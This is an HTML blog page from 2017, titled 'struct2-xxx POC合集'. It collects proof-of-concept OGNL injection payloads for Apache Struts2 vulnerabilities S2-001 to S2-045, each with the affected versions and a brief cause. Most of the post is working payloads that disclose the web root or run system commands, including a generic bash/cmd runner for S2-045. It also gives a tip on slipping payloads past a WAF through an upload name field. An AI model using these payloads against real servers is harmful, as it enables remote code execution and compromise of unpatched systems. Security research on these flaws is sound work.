@@ -1,0 +1,362 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>struct2-xxx POC合集 | warmeng</title>
+  <meta name="author" content="Mr.w">
+  
+  <meta name="description" content="感觉有的时候工具不如直接提交poc。">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="struct2-xxx POC合集"/>
+  <meta property="og:site_name" content="warmeng"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-70812759-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?cb5448498d7169c668b07c2b255d62c1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">warmeng</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="所有文章的匯總.">
+			  <i class=""></i>歸檔
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="所有文章的分類.">
+			  <i class=""></i>分類
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="所有文件的標籤.">
+			  <i class=""></i>標籤
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="新垣結衣的小跟班.">
+			  <i class=""></i>關於我
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> struct2-xxx POC合集</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>  感觉有的时候工具不如直接提交poc。</p>
+<a id="more"></a>
+<h1 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h1><p>  找到黑人的博客里面看到他曾经整理过poc集合，征求同意之后我就引用啦！传送门:<a href="http://blog.0kami.cn/2017/01/13/Struts2-history-payload/" target="_blank" rel="external">黑人大佬</a></p>
+<h2 id="Struts2-S2-001"><a href="#Struts2-S2-001" class="headerlink" title="Struts2 S2-001"></a>Struts2 S2-001</h2><p>影响版本：2.0.0 - 2.0.8<br>漏洞详情：<a href="https://struts.apache.org/docs/s2-001.html" target="_blank" rel="external">https://struts.apache.org/docs/s2-001.html</a></p>
+<p><strong>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</strong></p>
+<p>上文引用<img src="http://rickgray.me/" alt="rickgray"></p>
+<h2 id="构造poc"><a href="#构造poc" class="headerlink" title="构造poc"></a>构造poc</h2><p>获取tomcat执行路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</div></pre></td></tr></table></figure>
+<p>获取web根目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&apos;/&apos;)),#response.flush(),#response.close()&#125;</div></pre></td></tr></table></figure>
+<p>执行系统命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%&#123;#a=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()&#125;</div></pre></td></tr></table></figure>
+<h2 id="Struts-S2-005"><a href="#Struts-S2-005" class="headerlink" title="Struts S2-005"></a>Struts S2-005</h2><p>影响版本：2.0.0 - 2.1.8.1<br>漏洞详情：<a href="http://struts.apache.org/docs/s2-005.html" target="_blank" rel="external">http://struts.apache.org/docs/s2-005.html</a></p>
+<p><strong>struts2漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为ongl语句执行(可理解为java代码)。ongl表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式讲这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上</strong></p>
+<p>上文引用<img src="http://www.cnblogs.com/LittleHann/p/4606891.html" alt="LittleHann"></p>
+<h2 id="构造poc-1"><a href="#构造poc-1" class="headerlink" title="构造poc"></a>构造poc</h2><p>获取web根目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(&apos;\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\43context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\75false&apos;)(b))&amp;(&apos;\43c&apos;)((&apos;\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\43req\75@org.apache.struts2.ServletActionContext@getRequest()&apos;)(d))&amp;(i2)((&apos;\43xman\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(i97)((&apos;\43xman.getWriter().println(\43req.getRealPath(%22\u005c%22))&apos;)(d))&amp;(i99)((&apos;\43xman.getWriter().close()&apos;)(d))</div></pre></td></tr></table></figure>
+<p>执行系统命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(&apos;\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\43context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\75false&apos;)(b))&amp;(&apos;\43c&apos;)((&apos;\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\43mycmd\75\&apos;&quot;+cmd+&quot;\&apos;&apos;)(d))&amp;(h)((&apos;\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)&apos;)(d))&amp;(i)((&apos;\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())&apos;)(d))&amp;(j)((&apos;\43myres\75new\40byte[51020]&apos;)(d))&amp;(k)((&apos;\43mydat.readFully(\43myres)&apos;)(d))&amp;(l)((&apos;\43mystr\75new\40java.lang.String(\43myres)&apos;)(d))&amp;(m)((&apos;\43myout\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(n)((&apos;\43myout.getWriter().println(\43mystr)&apos;)(d))</div></pre></td></tr></table></figure>
+<p>上述poc引用自k8team </p>
+<h2 id="Struts2-S2-009"><a href="#Struts2-S2-009" class="headerlink" title="Struts2 S2-009"></a>Struts2 S2-009</h2><p>影响版本：2.0.0 - 2.3.1.1<br>漏洞详情：<a href="https://struts.apache.org/docs/s2-009.html" target="_blank" rel="external">https://struts.apache.org/docs/s2-009.html</a></p>
+<p><strong>漏洞利用点跟S2-003和S2-005类似，利用OGNL表达式(1)(2),会执行1的OGNL表达式，009构造了的方法为test=(some OGNL 表达式)(1)&amp;z[(test)(1)]=true。<br>z[(test)(1)]=true,对struts2来说是合法的参数，但是(test)(1)会执行上述说的方法，test的值被带入计算，造成命令执行。</strong></p>
+<h2 id="构造poc-2"><a href="#构造poc-2" class="headerlink" title="构造poc"></a>构造poc</h2><p>弹计算器</p>
+<p>ps:实验环境试了好几次都不能执行系统命令，路过的大佬求指教。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">person.name=(#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]= new java.lang.Boolean(false), #_memberAccess[&quot;allowStaticMethodAccess&quot;]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec(&apos;open /Applications/Calculator.app&apos;))(meh)&amp;z[(person.name)(&apos;meh&apos;)]=true</div></pre></td></tr></table></figure>
+<p>获取web根目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">person.name=%28%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%20new%20java.lang.Boolean%28false%29%2C%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D@org.apache.struts2.ServletActionContext@getRequest%28%29%2C%23outstr%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23outstr.println%28%27webpath%3A%27%2b%23req.getRealPath%28%22%2f%22%29%29%2C%23outstr.close%28%29%29%28meh%29&amp;z%5B%28person.name%29%28%27meh%27%29%5D&quot;</div></pre></td></tr></table></figure>
+<h2 id="Struts2-S2-012"><a href="#Struts2-S2-012" class="headerlink" title="Struts2 S2-012"></a>Struts2 S2-012</h2><p>影响版本：2.0.0 - 2.3.13<br>漏洞详情：<a href="https://cwiki.apache.org/confluence/display/WW/S2-012" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-012</a></p>
+<p><strong>Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量,struts在获取其值时会执行OGNL表达式，从而造成命令执行</strong></p>
+<h2 id="构造poc-3"><a href="#构造poc-3" class="headerlink" title="构造poc"></a>构造poc</h2><p>获取web根路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23response%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2C%23response.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23response.flush%28%29%2C%23response.close%28%29%29%7D</div></pre></td></tr></table></figure>
+<p>执行系统命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%29%7D%0A%0A</div></pre></td></tr></table></figure>
+<h2 id="Struts2-S2-013-S2-014"><a href="#Struts2-S2-013-S2-014" class="headerlink" title="Struts2 S2-013/S2-014"></a>Struts2 S2-013/S2-014</h2><p>影响版本：2.0.0 - 2.3.14.1<br>漏洞详情：<a href="https://cwiki.apache.org/confluence/display/WW/S2-01" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-01</a></p>
+<p><strong>标签s:url和s:a中提供include参数，其参数值可以为</strong></p>
+<pre><code>1.none - include no parameters in the URL (default)
+2.get - include only GET parameters in the URL
+3.all - include both GET and POST parameters in the URL
+</code></pre><p>如果参数值为get或all，在获取对应的参数值时执行了OGNL表达式</p>
+<h2 id="构造poc-4"><a href="#构造poc-4" class="headerlink" title="构造poc"></a>构造poc</h2><p>获取web根目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a=$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println(&apos;webpath%3a&apos;%2b%23req.getRealPath(&quot;/&quot;)),%23out.close())&#125;</div></pre></td></tr></table></figure>
+<p>执行系统命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a=$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23a=@java.lang.Runtime@getRuntime().exec(&apos;&quot;+cmd+&quot;&apos;).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println(&apos;dbapp%3a&apos;%2bnew java.lang.String(%23d)),%23out.close())&#125;</div></pre></td></tr></table></figure>
+<h2 id="Struts2-S2-016"><a href="#Struts2-S2-016" class="headerlink" title="Struts2 S2-016"></a>Struts2 S2-016</h2><p>影响版本：2.0.0 - 2.3.15<br>漏洞详情：<a href="https://struts.apache.org/docs/s2-016.html" target="_blank" rel="external">https://struts.apache.org/docs/s2-016.html</a></p>
+<p><strong>DefaultActionMapper 类支持以 action:，redirect: 和 redirectAction: 作为访问前缀，前缀后面可以跟 OGNL 表达式，由于 Struts2 未对其进行过滤，导致任意 Action 可以使用这些前缀执行任意 OGNL 表达式，从而导致任意命令执行</strong></p>
+<p>上文引用<img src="http://rickgray.me/" alt="rickgray"></p>
+<p>构造poc</p>
+<p>获取web根目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?redirect:$&#123;#req=#context.get(&apos;co&apos;+&apos;m.open&apos;+&apos;symphony.xwo&apos;+&apos;rk2.disp&apos;+&apos;atcher.HttpSer&apos;+&apos;vletReq&apos;+&apos;uest&apos;),#resp=#context.get(&apos;co&apos;+&apos;m.open&apos;+&apos;symphony.xwo&apos;+&apos;rk2.disp&apos;+&apos;atcher.HttpSer&apos;+&apos;vletRes&apos;+&apos;ponse&apos;),#resp.setCharacterEncoding(&apos;UTF-8&apos;),#ot=#resp.getWriter (),#ot.print(&apos;web&apos;),#ot.print(&apos;path:&apos;),#ot.print(#req.getSession().getServletContext().getRealPath(&apos;/&apos;)),#ot.flush(),#ot.close()&#125;</div></pre></td></tr></table></figure>
+<p>执行系统命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?redirect:$&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&apos;whoami&apos;&#125;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&apos;co&apos;+&apos;m.ope&apos;+&apos;nsymph&apos;+&apos;ony.x&apos;+&apos;wor&apos;+&apos;k2.disp&apos;+&apos;atch&apos;+&apos;er.HttpSe&apos;+&apos;rvletRe&apos;+&apos;sponse&apos;),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()&#125;&apos;</div></pre></td></tr></table></figure>
+<p>还有一种比较隐蔽的方法，将PoC放在文件上传的name处，过waf。</p>
+<h2 id="Struts2-S2-019"><a href="#Struts2-S2-019" class="headerlink" title="Struts2 S2-019"></a>Struts2 S2-019</h2><p>影响版本：2.0.0 - 2.3.15.1<br>漏洞详情：<a href="https://cwiki.apache.org/confluence/display/WW/S2-01" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-01</a></p>
+<p><strong>该漏洞成因为开启了开发者模式，传入debug=command&amp;expression=导致执行OGNL表达式，从而造成命令执行漏洞。</strong></p>
+<h2 id="构造poc-5"><a href="#构造poc-5" class="headerlink" title="构造poc"></a>构造poc</h2><p>获取web根路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">debug=command&amp;expression=%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23resp.setCharacterEncoding%28%27UTF-8%27%29%2C%23resp.getWriter%28%29.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29</div></pre></td></tr></table></figure>
+<p>执行系统命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">debug=command&amp;expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A</div></pre></td></tr></table></figure>
+<h2 id="Struts2-S2-032"><a href="#Struts2-S2-032" class="headerlink" title="Struts2 S2-032"></a>Struts2 S2-032</h2><p>影响版本：2.3.20 - 2.3.28 （except 2.3.20.3 and 2.3.24.3）<br>漏洞详情：<a href="https://struts.apache.org/docs/s2-032.html" target="_blank" rel="external">https://struts.apache.org/docs/s2-032.html</a></p>
+<p><strong>在配置了 Struts2 DMI 为 True 的情况下，可以使用 method: Action 前缀去调用声明为 public 的函数，DMI 的相关使用方法可参考官方介绍（Dynamic Method Invocation），这个 DMI 的调用特性其实一直存在，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL 计算，而在高版本中会，代码详情可参考阿尔法实验室的报告 - 《Apache Struts2 s2-032技术分析及漏洞检测脚本》</strong></p>
+<p>上文引用<img src="http://rickgray.me/" alt="rickgray"></p>
+<h2 id="构造poc-6"><a href="#构造poc-6" class="headerlink" title="构造poc"></a>构造poc</h2><p>获取web根目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#req=#context.get(#parameters.a[0]),#resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot.flush(),#ot.close&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath:</div></pre></td></tr></table></figure>
+<p>执行系统命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag:</div></pre></td></tr></table></figure>
+<h2 id="Struts2-S2-037"><a href="#Struts2-S2-037" class="headerlink" title="Struts2 S2-037"></a>Struts2 S2-037</h2><p>影响版本：2.3.20 - 2.3.28.1<br>漏洞详情：<a href="http://struts.apache.org/docs/s2-037.html" target="_blank" rel="external">http://struts.apache.org/docs/s2-037.html</a></p>
+<p><strong>这个漏洞和之前S2-032/033是一个地方，都是在DefaultActionInvocation.java的invokeAction方法中没有对于methodName参数内容进行校验，便直接丢到了getValue方法里面，从而造成Ongl表达式的注入。</strong></p>
+<p>上文引用<img src="http://blog.nsfocus.net/" alt="nsfocus"></p>
+<h2 id="构造poc-7"><a href="#构造poc-7" class="headerlink" title="构造poc"></a>构造poc</h2><p>获取web根目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#req=#context.get(#parameters.a[0]),#resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot.flush(),#ot.close):xx.toString.json?&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath:</div></pre></td></tr></table></figure>
+<p>执行系统命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()):xx.toString.json?&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag:</div></pre></td></tr></table></figure>
+<h2 id="Struts2-S2-045"><a href="#Struts2-S2-045" class="headerlink" title="Struts2 S2-045"></a>Struts2 S2-045</h2><p>影响版本：2.3.5 - 2.3.31 ／ 2.5 - 2.5.10<br>漏洞详情：<a href="https://cwiki.apache.org/confluence/display/WW/S2-045" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-045</a></p>
+<h2 id="构造poc-8"><a href="#构造poc-8" class="headerlink" title="构造poc"></a>构造poc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Content-Type:%&#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;&quot; + cmd + &quot;&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</div></pre></td></tr></table></figure>
+	  
+	</div>
+
+	<div>
+  	<center>
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>上一頁</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2017/10/15/wifi-share/" type="button" class="btn btn-default ">下一頁<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    
+    <div class="ds-thread" data-thread-key="2017/10/30/struct2/" data-title="struct2-xxx POC合集"
+         data-url="http://www.warmeng.com/2017/10/30/struct2/"></div>
+    
+</section>
+
+
+	</div> <!-- col-md-9/col-md-12 -->
+		
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2017-10-30 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/攻略/">攻略<span>5</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/攻略/">攻略<span>3</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+	</div>
+		
+
+</div><!-- row -->
+
+<script type="text/javascript">
+  var duoshuoQuery = { short_name: 'true' };
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';
+    ds.async = true;
+    ds.src = 'http://static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script>
+
+
+<span id="busuanzi_container_page_pv">
+   本文总阅读量<span id="busuanzi_value_page_pv"></span>    次
+</span>
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  &copy; 2017 Mr.w
+  
+
+  <!--
+      with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a href="http://github.com/wzpan/hexo-theme-freemind/">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
+     <br> Theme by <a href="http://github.com/wzpan/hexo-theme-freemind/">Freemind.386</a>.    -->
+</p>
+<span id="busuanzi_container_site_uv"> 
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span> </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
